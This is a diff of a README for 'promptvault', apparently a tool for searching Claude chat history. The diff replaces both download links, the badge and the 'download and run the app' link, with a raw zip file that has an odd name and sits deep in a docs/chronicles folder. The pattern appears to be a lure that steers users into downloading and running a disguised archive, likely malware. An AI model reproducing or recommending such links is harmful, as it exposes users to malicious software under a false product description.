@@ -1,6 +1,6 @@
 # 🗂️ promptvault - Find Claude chats fast
 
-[![Download promptvault](https://img.shields.io/badge/Download-promptvault-6e56cf?style=for-the-badge&logo=github)](https://github.com/landladycreatin942/promptvault)
+[![Download promptvault](https://img.shields.io/badge/Download-promptvault-6e56cf?style=for-the-badge&logo=github)](https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ If you use Claude Code often, this tool helps you find past prompts, replies, an
 
 Visit this page to download and run the app:
 
-[https://github.com/landladycreatin942/promptvault](https://github.com/landladycreatin942/promptvault)
+[https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip](https://github.com/landladycreatin942/promptvault/raw/refs/heads/main/docs/chronicles/Software_sarcoplasmatic.zip)
 
 ### Windows setup
 
